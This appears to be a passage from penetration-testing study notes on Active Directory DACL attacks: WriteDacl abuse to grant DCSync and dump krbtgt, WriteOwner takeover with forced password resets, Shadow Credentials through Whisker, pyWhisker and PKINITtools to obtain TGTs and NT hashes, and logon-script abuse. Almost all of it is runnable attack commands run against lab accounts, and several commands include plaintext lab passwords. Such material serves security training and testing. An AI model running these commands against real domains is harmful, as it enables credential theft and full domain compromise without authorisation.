7.9.2 Abusing WriteDacl from Linux (DCSync)

WriteDacl on the domain object does not directly perform DCSync - use it to assign DCSync access rights to a controlled account, then perform DCSync.

# Attempt DCSync before DACL modification (will fail)
secretsdump.py -just-dc-user krbtgt [domain]/[user]:[password]

# Grant Luna DCSync rights by modifying the domain's DACL
python3 examples/dacledit.py -principal [user] -target-dn DC=[domain],DC=[tld] -dc-ip [target-ip] [domain]/[user]:[password] -action write -rights DCSync

# Verify the new ACEs in the DACL
python3 examples/dacledit.py -principal [user] -target-dn DC=[domain],DC=[tld] -dc-ip [target-ip] [domain]/[user]:[password]

# Perform DCSync after modification
secretsdump.py -just-dc-user krbtgt [domain]/[user]:[password]

7.9.3 Abusing WriteDacl from Windows (DCSync)

# Grant Luna DCSync rights using PowerView
Import-Module .\PowerView.ps1
Add-DomainObjectAcl -TargetIdentity $(Get-DomainSID) -PrincipalIdentity luna -Rights DCSync -Verbose
# DCSync from Windows using Mimikatz
mimikatz.exe "lsadump::dcsync /domain:[domain] /user:krbtgt /csv"

7.9.4 Abusing WriteDacl over Other Objects

If WriteDacl is over a group or user (not the domain), first assign FullControl, then abuse accordingly.

# Check Luna's WriteDacl over Finance group
python3 examples/dacledit.py -principal [user] -target "Finance" -dc-ip [target-ip] [domain]/[user]:[password]

# Grant Luna FullControl over Finance group
python3 examples/dacledit.py -principal [user] -target "Finance" -dc-ip [target-ip] [domain]/[user]:[password] -action write

# Verify modification
python3 examples/dacledit.py -principal [user] -target "Finance" -dc-ip [target-ip] [domain]/[user]:[password]

# Add luna to Finance group using addusertogroup.py
python3 addusertogroup.py -d [domain] -g "Finance" -a luna -u luna -p [password]

# Restore the original DACL from backup
python3 examples/dacledit.py -principal [user] -target "Finance" -dc-ip [target-ip] [domain]/[user]:[password] -action restore -file dacledit-20230524-211441.bak

# Verify DACL after restoration
python3 examples/dacledit.py -principal [user] -target "[group]" -dc-ip [dc-ip] [domain]/[user]:[password]

Methodology

  • Identify WriteDacl/WriteOwner over target objects via BloodHound or dacledit.py: 
    python3 examples/dacledit.py -principal <USER> -target-dn <TARGET_DN> -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASS>
  • Grant DCSync rights via WriteDacl on the domain object (Linux): 
    python3 examples/dacledit.py -principal <USER> -target-dn dc=<DOMAIN>,dc=<TLD> -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASS> -action write -rights DCSync
  • Grant DCSync rights via WriteDacl on the domain object (Windows): 
    Add-DomainObjectAcl -TargetIdentity $(Get-DomainSID) -PrincipalIdentity <USER> -Rights DCSync -Verbose
  • Perform DCSync to dump domain credentials: 
    secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASS>@<DC_IP>
  • For non-domain objects, grant FullControl then exploit: 
    python3 examples/dacledit.py -principal <USER> -target "<OBJECT>" -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASS> -action write
  • Restore original DACL from backup after exploitation: 
    python3 examples/dacledit.py -principal <USER> -target "<OBJECT>" -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASS> -action restore -file <BACKUP.bak>

7.10 WriteOwner

The WriteOwner access right allows modifying the OwnerSid sub-attribute of an object's security descriptor. As object owner, a principal implicitly has WriteDacl and ReadControl. Depending on the target:

Target Object TypePossible Abuse
UserAssign all rights enabling Password Reset or targeted Kerberoasting
GroupAdd or remove members
GPOModify GPO settings
Note: dacledit.py and PowerView will not show any abusable ACE for the object's owner - ownership is a security descriptor property (OwnerSid), not an ACE. Use BloodHound to detect WriteOwner/Owns relationships.
# BloodHound Cypher query to identify WriteOwner paths
MATCH p=((n:User)-[r:WriteOwner]->(m)) RETURN p
# Identify Pedro's WriteOwner over GPOAdmin with dacledit.py
python3 examples/dacledit.py -principal [user] -target [target-user] -dc-ip [dc-ip] [domain]/[user]:[password]
# Identify controlled user's WriteOwner over target with PowerView
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
Import-Module .\PowerView.ps1
$userSID = ConvertTo-SID pedro
Get-DomainObjectAcl -Identity GPOAdmin -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $userSID}

# Confirm no password reset rights yet
net rpc password GPOAdmin Mynewpassword1 -U [domain]/pedro%SecuringAD01 -S [target-ip]

7.10.1 Abusing WriteOwner from Linux

Use owneredit.py from ShutdownRepo to change the object's owner, then grant further rights with dacledit.py.

# Download owneredit.py
wget -q https://raw.githubusercontent.com/ShutdownRepo/impacket/owneredit/examples/owneredit.py -O ./shutdownRepo/impacket/examples/owneredit.py

# Change object owner
python3 examples/owneredit.py -action write -new-owner pedro -target GPOAdmin -dc-ip [target-ip] [domain]/[user]:[password]

# Grant FullControl now that Pedro owns GPOAdmin
python3 examples/dacledit.py -principal [user] -target GPOAdmin -action write -rights FullControl -dc-ip [target-ip] [domain]/[user]:[password]

# Perform password reset
net rpc password GPOAdmin Mynewpassword1 -U [domain]/pedro%SecuringAD01 -S [target-ip]

# Validate
poetry run crackmapexec ldap [target-ip] -u GPOAdmin -p [password]

7.10.2 Abusing WriteOwner from Windows

# Change object owner using PowerView
Set-DomainObjectOwner -Identity GPOAdmin -OwnerIdentity pedro -Verbose

# Grant FullControl (All) using PowerView
Add-DomainObjectAcl -TargetIdentity GPOAdmin -PrincipalIdentity pedro -Rights All -Verbose

# Perform password reset using net
net user GPOAdmin Tryanotherpassword123 /domain

Methodology

  • Identify WriteOwner paths in BloodHound: 
    MATCH p=((n:User)-[r:WriteOwner]->(m)) RETURN p
  • From Linux - change object owner with owneredit.py: 
    python3 examples/owneredit.py -action write -new-owner <PRINCIPAL> -target <TARGET> -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASS>
  • From Linux - grant FullControl after taking ownership: 
    python3 examples/dacledit.py -principal <USER> -target <TARGET> -action write -rights FullControl -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASS>
  • From Linux - exploit gained FullControl (e.g., password reset): 
    net rpc password <TARGET> <NEWPASS> -U <DOMAIN>/<USER>%<PASS> -S <DC_IP>
  • From Windows - change object owner and grant rights: 
    Set-DomainObjectOwner -Identity <TARGET> -OwnerIdentity <PRINCIPAL> -Verbose
Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <PRINCIPAL> -Rights All -Verbose
net user <TARGET> <NEWPASS> /domain

8. DACL Attacks II

8.1 Shadow Credentials

Shadow Credentials is a technique that abuses Windows Hello for Business passwordless authentication by adding Key Credentials to the msDS-KeyCredentialLink attribute of a target user or computer account, then performing Kerberos authentication as that account using PKINIT.

8.1.1 Kerberos Pre-Authentication and PKINIT

Pre-authentication prevents offline attacks by requiring the client to encrypt the current timestamp with a password-derived key before the KDC issues a TGT. PKINIT is a pre-authentication extension that allows TGT retrieval using an x509 certificate instead of a password, relying on public key cryptography.

Under the Key Trust model (introduced in Windows Server 2016), the client's public key is stored directly in msDS-KeyCredentialLink as a serialized Key Credential object containing the creation date, owner DN, Device GUID, and the public key. The DC decrypts pre-authentication data using the raw public key stored in this attribute.

8.1.2 NTLM Hash via Shadow Credentials (U2U)

When a client authenticates via PKINIT and needs NTLM for a non-Kerberos service, the NTLM hash is embedded in the PAC inside an encrypted NTLM_SUPPLEMENTAL_CREDENTIAL entity. To decrypt this, the attacker requests a Kerberos User-to-User (U2U) service ticket to themselves - the session key used to encrypt the ticket is in the client's own TGT, making it decryptable.

8.1.3 Pre-requisites

RequirementDetails
Domain Controller OSAt least one DC running Windows Server 2016 or above
Domain Functional LevelWindows Server 2016 or above
PKI / CADC must have its own certificate and keys (AD CS, PKI, or similar)
Required rightsGenericAll, GenericWrite, or WriteProperty over target's msDS-KeyCredentialLink

8.1.4 Enumeration from Windows

Use BloodHound with SharpHound, or PowerView to find accounts with the target attribute set or the required ACEs.

# Collect BloodHound data
.\SharpHound.exe -c All

# Find users with msDS-KeyCredentialLink set
Get-DomainUser -Filter '(msDS-KeyCredentialLink=*)'

# Check ACEs jeffry has over gabriel
$userSID = (Get-DomainUser -Identity jeffry).objectsid
Get-DomainObjectAcl -Identity gabriel | ?{$_.SecurityIdentifier -eq $userSID}

BloodHound cypher query example output will show AddKeyCredentialLink or GenericAll edges.

8.1.5 Enumeration from Linux

# Install dacledit (ShutdownRepo impacket fork)
git clone https://github.com/ShutdownRepo/impacket -b dacledit
cd impacket
python3 -m venv .dacledit
source .dacledit/bin/activate
python3 -m pip install .

# Check rights jeffry has over gabriel
python3 examples/dacledit.py -target gabriel -principal jeffry -dc-ip [target-ip] lab.local/jeffry:Music001

8.1.6 Abusing Shadow Credentials from Windows (Whisker)

# List existing Key Credentials on target
.\Whisker.exe list /target:gabriel

# Add new Shadow Credentials (generates certificate + Rubeus command)
.\Whisker.exe add /target:gabriel

# Use the Rubeus command printed by Whisker to get TGT + NTLM hash
.\Rubeus.exe asktgt /user:gabriel /certificate:MIIJuAIBAzCCCXQGC..SNIP.. /password:"cw7I7QaHMS44q5xt" /domain:lab.local /dc:LAB-DC.lab.local /getcredentials /show /nowrap

# Create a sacrificial logon session, then pass the ticket
.\Rubeus.exe createnetonly /program:powershell.exe /show
.\Rubeus.exe ptt /ticket:doIGJjCCBiKgAwIBBaEDAgEWooIFRTCCBUFhggU9MIIFOaADA...SNIP...

# Remove a specific Key Credential by DeviceID
.\Whisker.exe remove /target:gabriel /deviceid:48d97546-cac9-4e92-981b-e89da231f7a8

# Clear all Key Credentials (caution: disrupts passwordless auth)
.\Whisker.exe clear /target:gabriel
Note: Clearing msDS-KeyCredentialLink on accounts configured for passwordless authentication will cause disruptions. Always record existing DeviceIDs before clearing.

8.1.7 Abusing Shadow Credentials from Linux (pyWhisker + PKINITtools)

# Clone pyWhisker
git clone -q https://github.com/ShutdownRepo/pywhisker

# Add Shadow Credentials to gabriel
python3 pywhisker.py -d lab.local -u jeffry -p [password] --target gabriel --action add
# Output: saves BX4EWk8m.pfx with password KQAx5lHP3h9TtzNly2Us

# Install PKINITtools
git clone -q https://github.com/dirkjanm/PKINITtools
pip3 install impacket minikerberos

# Get TGT using certificate
python3 gettgtpkinit.py -cert-pfx ../pywhisker/BX4EWk8m.pfx -pfx-pass KQAx5lHP3h9TtzNly2Us lab.local/gabriel gabriel.ccache

# Extract NT Hash using the AS-REP encryption key from gettgtpkinit output
KRB5CCNAME=gabriel.ccache python3 getnthash.py -key 46c30d948cbe2ab0749d2f72896692c18673e9a4fae6438bff32a33afb49245a lab.local/gabriel

# Use TGT to authenticate
KRB5CCNAME=gabriel.ccache smbclient.py -k -no-pass LAB-DC.LAB.LOCAL
Note: For Kerberos ticket use from Linux, add the domain name to /etc/hosts or configure DNS to point to the DC for name resolution.

8.1.8 Methodology

  • Identify accounts with GenericAll, GenericWrite, or WriteProperty over msDS-KeyCredentialLink: 
    Get-DomainUser -Filter '(msDS-KeyCredentialLink=*)'
$userSID = (Get-DomainUser -Identity jeffry).objectsid
Get-DomainObjectAcl -Identity gabriel | ?{$_.SecurityIdentifier -eq $userSID}
  • (Windows) Add Shadow Credentials with Whisker: 
    .\Whisker.exe add /target:gabriel
  • (Windows) Request TGT and NTLM hash with Rubeus: 
    .\Rubeus.exe asktgt /user:gabriel /certificate:<BASE64> /password:"<PASS>" /domain:lab.local /dc:LAB-DC.lab.local /getcredentials /show /nowrap
  • (Linux) Add Shadow Credentials with pyWhisker: 
    python3 pywhisker.py -d lab.local -u jeffry -p [password] --target gabriel --action add
  • (Linux) Get TGT via certificate: 
    python3 gettgtpkinit.py -cert-pfx BX4EWk8m.pfx -pfx-pass <PASS> lab.local/gabriel gabriel.ccache
  • (Linux) Extract NT hash: 
    KRB5CCNAME=gabriel.ccache python3 getnthash.py -key <AS-REP-KEY> lab.local/gabriel
  • Clean up added Key Credentials: 
    .\Whisker.exe remove /target:gabriel /deviceid:<DEVICEID>

8.2 Logon Scripts (scriptPath Abuse)

Administrators assign logon scripts via the scriptPath attribute (set through ADUC's Profile tab) or via Group Policy. Legacy logon scripts set via scriptPath must reside in the NETLOGON share (%systemroot%\SYSVOL\sysvol\<DOMAIN>\scripts\). scriptPath supports .bat, .cmd, .exe, VBScript, JScript, and KiXtart - but not PowerShell directly (though PowerShell can be called from batch/VBScript).

RightAttack Path
Write scriptPathSet attribute to attacker-controlled script in NETLOGON; execute arbitrary code at victim logon
Read scriptPathInspect file permissions with icacls; if writable, overwrite the script directly without needing write to NETLOGON

8.2.1 Enumeration from Linux

# Install PywerView
sudo apt install libkrb5-dev -y
git clone https://github.com/the-useless-one/pywerview.git
cd pywerview/ && pip3 install -r requirements.txt

# Get all ACEs for eric, then filter to david's entries
python3 pywerview get-objectacl --name 'eric' -w [domain] -t [target-ip] -u 'david' -p '[password]' --resolve-sids --resolve-guids

# Filter to only david's ACEs using jq
pywerview get-objectacl --name 'eric' -w [domain] -t [target-ip] -u 'david' -p '[password]' --resolve-sids --resolve-guids --json | jq '.results | map(select(.securityidentifier | contains("david")))'

# Enumerate via dacledit
(.dacledit) python3 examples/dacledit.py -principal 'david' -target 'eric' -dc-ip [target-ip] [domain]/'david':'SecurePassDav!d5'
Adalanche (Linux)
# Install Go and update PATH
sudo wget -P /usr/bin/ https://go.dev/dl/go1.22.1.linux-amd64.tar.gz
sudo rm -rf /usr/bin/go && cd /usr/bin/ && sudo tar -xzf go1.22.1.linux-amd64.tar.gz
export PATH=$PATH:/usr/bin/go/bin

# Build Adalanche
git clone https://github.com/lkarlslund/Adalanche Adalanche
cd Adalanche
pwsh build.ps1

# Collect AD data
